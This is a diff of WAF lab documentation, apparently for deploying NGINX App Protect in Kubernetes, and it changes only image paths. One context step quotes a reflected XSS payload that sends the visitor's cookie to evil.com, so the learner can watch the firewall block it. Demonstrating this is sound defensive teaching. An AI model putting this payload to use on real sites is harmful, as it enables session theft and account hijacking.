@@ -35,13 +35,13 @@ Your support ID is: 5374014569933997707
 Did you notice the blocking page is similar to F5 ASM and Adv. WAF?
 ====
 
-image:./pictures/image18.png[image]
+image:image18.png[image]
 
 . Execute the second attack by appending
 `?item='><script>document.location='http://evil.com/steal'+document.cookie</script>`
 to the application URL, and observe the results.
 
-image:./pictures/image19.png[image]
+image:image19.png[image]
 
 . Feel free to execute any attacks you would like and observe the
 results.
@@ -187,7 +187,7 @@ of the attack.
 
 Example:
 
-image:./pictures/image13.png[image]
+image:image13.png[image]
 
 Congratulations on completing the Lab! You have learned how to deploy
 the NGINX App Protect WAF in Kubernetes and how to use the NGINX App
